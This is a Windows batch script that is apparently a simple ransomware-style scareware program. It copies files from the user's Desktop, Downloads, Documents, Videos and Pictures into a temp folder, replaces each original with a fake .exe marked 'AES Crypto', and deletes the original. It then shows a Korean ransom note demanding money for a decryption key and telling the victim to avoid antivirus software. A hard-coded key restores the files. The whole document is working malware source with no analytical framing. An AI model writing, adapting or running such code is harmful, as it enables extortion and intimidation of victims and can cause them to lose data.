@echo off
rd %temp%\Ransomware /q
md %temp%\Ransomware
md %temp%\Ransomware\de >nul 2>&1
md %temp%\Ransomware\down >nul 2>&1
md %temp%\Ransomware\doucm  >nul 2>&1
md %temp%\Ransomware\pic >nul 2>&1
md %temp%\Ransomware\videos >nul 2>&1
copy "%userprofile%\Desktop\*.*"  "%temp%\Ransomware\de\" >nul 2>&1
copy "%userprofile%\Downloads\*.*" "%temp%\Ransomware\down\" >nul 2>&1
copy "%userprofile%\Documents\*.*" "%temp%\Ransomware\doucm\" >nul 2>&1
copy "%userprofile%\Videos\*.*" "%temp%\Ransomware\videos\" >nul 2>&1
copy "%userprofile%\Pictures\*.*" "%temp%\Ransomware\pic" >nul 2>&1
cd %userprofile%\Desktop
For /F "tokens=*" %%i in ('dir /b /s /a-h /a-d') do (
echo AES Crypto>"%%~i.exe"
Del /f /q "%%~i"
)

cd %userprofile%\Downloads
For /F "tokens=*" %%k in ('dir /b /s /a-h /a-d') do (
echo  AES Crypto>"%%~k.exe"
Del /f /q "%%~k"
)

cd %userprofile%\Documents

For /F "tokens=*" %%a in ('dir /b /s /a-h /a-d') do (
echo  AES Crypto>"%%~a.exe"
Del /f /q "%%~a"
)
cd %userprofile%\Videos

For /F "tokens=*" %%l in ('dir /b /s /a-h /a-d') do (
echo  AES Crypto>"%%~l.exe"
Del /f /q "%%~l"
)

cd %userprofile%\Pictures

For /F "tokens=*" %%j in ('dir /b /s /a-h /a-d') do (
echo AES Crypto>"%%~j.exe"
Del /f /q "%%~j"
)

:1
echo 당신의 중요한 파일이 암호화되었습니다
echo 해독키를 얻을라면 곽에게 %random%이 돈을 넣어주십시오.
echo 그리고 백신프로그램을 사용하지마시오
echo 그리고 파일의 확장자를 바꾸지마십시오!
echo 파일의 확장자를 바꾸면 식별키랑 헷갈려져 복구가 불가능하게 될수있습니다
echo 해독키를 얻었다면 밑에 해독키를 입력하십시오
set /p pass=해독키 입력 : 
goto a

:b
echo 해독키가 일치하지않습니다 다시 입력하시오.....
set /p pass=해독키 입력 : 
:a
if not %pass%==HKDML_12345_XMCLXMQPXO_21300xmcc_123c9912mx_12399xmfnf goto b
del /f /q %userprofile%\Desktop\*.exe
del /f /q %userprofile%\Documents\*.exe
del /f /q %userprofile%\Downloads\*.exe
del /f /q %userprofile%\Videos\*.exe
del /f /q %userprofile%\Pictures\*.exe
move "%temp%\Ransomware\de\*.*" "%userprofile%\Desktop\" >nul 2>&1
move "%temp%\Ransomware\down\*.*" "%userprofile%\Downloads\" >nul 2>&1
move "%temp%\Ransomware\doucm\*.*" "%userprofile%\Documents\" >nul 2>&1
move "%temp%\Ransomware\videos\*.*" "%userprofile%\videos\" >nul 2>&1
move "%temp%\Ransomware\pic\*.*" "%userprofile%\Pictures\" >nul 2>&1
